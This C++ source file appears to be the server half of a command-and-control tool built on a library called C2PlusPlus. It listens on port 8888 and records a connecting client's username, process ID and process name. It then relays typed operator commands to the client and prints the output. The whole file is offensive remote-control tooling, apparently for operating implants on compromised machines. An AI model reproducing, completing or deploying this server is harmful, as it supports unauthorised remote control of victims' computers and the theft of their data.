// Server code 
#include <C2PlusPlus/IncludeMe.h>
#include <iostream>
#include <sstream>

using namespace C2PlusPlus;

int main()
{
	if (Network::Initialize())
	{
		std::cout << "Winsock api successfully initialized." << std::endl;

		Socket socket;
		if (socket.Create() == PResult::P_Success)
		{
			std::cout << "Socket successfully created." << std::endl;
			if (socket.Listen(IPEndpoint("0.0.0.0", 8888)) == PResult::P_Success)
			{
				std::cout << "Socket successfully listening on port 8888." << std::endl << std::endl;
				Socket newConnection;
				if (socket.Accept(newConnection) == PResult::P_Success)
				{
					//std::cout << "New connection accepted." << std::endl;

					Clients client;
					std::vector <Clients> clientList;


					std::string buffer = "";
					while (true)
					{
						if (clientList.empty())
						{
							uint32_t bufferSize = 0;
							int result = newConnection.RecvAll(&bufferSize, sizeof(uint32_t));
							if (result != PResult::P_Success)
								break;

							bufferSize = ntohl(bufferSize);

							if (bufferSize > g_MaxPacketSize)
								break;

							buffer.resize(bufferSize);
							result = newConnection.RecvAll(&buffer[0], bufferSize);
							if (result != PResult::P_Success)
								break;

						// Convert to variables
						// https://stackoverflow.com/questions/33190798/how-to-parse-a-string-into-multiple-variables-when-one-part-can-have-spaces
						
						// Set client variables 
						
							std::string id, username, processId, processName, is64;
							std::istringstream ss(buffer);

							ss >> client.id >> client.username >> client.processId >> client.processName >> client.is64;

							std::cout << "[+] Id:" << client.id << " Username:" + client.username << " ProcessID:" + std::to_string(client.processId) << " ProcessName:" + client.processName << " Process x86:" + std::to_string(client.is64) << std::endl;

							clientList.push_back(client);
						}	
						else
						{


							//std::cout << "Execute command " << std::endl;
							std::cout << "> ";
							std::getline(std::cin, buffer);

							



							uint32_t bufferSize = buffer.size();
							bufferSize = htonl(bufferSize);
							int result = newConnection.SendAll(&bufferSize, sizeof(uint32_t));
							if (result != PResult::P_Success)
								break;

							result = newConnection.SendAll(buffer.data(), buffer.size());
							if (result != PResult::P_Success)
								break;// break;


							// Receive data
							// std::cout << "Waiting client response.." << std::endl;

							bufferSize = 0;
							result = newConnection.RecvAll(&bufferSize, sizeof(uint32_t));
							if (result != PResult::P_Success)
								break;

							bufferSize = ntohl(bufferSize);

							/*if (bufferSize > g_MaxPacketSize)
								break;*/

							buffer.resize(bufferSize);
							result = newConnection.RecvAll(&buffer[0], bufferSize);
							if (result != PResult::P_Success)
								break;

							std::cout << "[" << bufferSize << "] " << buffer << std::endl;
						}

					}
					newConnection.Close();
				}
				else
				{
					std::cerr << "Failed to accept new connection." << std::endl;
				}
			}
			else
			{
				std::cerr << "Failed to Listen on port 8888." << std::endl;
			}

			socket.Close();
		}
		else
		{
			std::cerr << "Socket failed to create." << std::endl;
		}
	}
	Network::Shutdown();
	system("pause");
	return 0;
}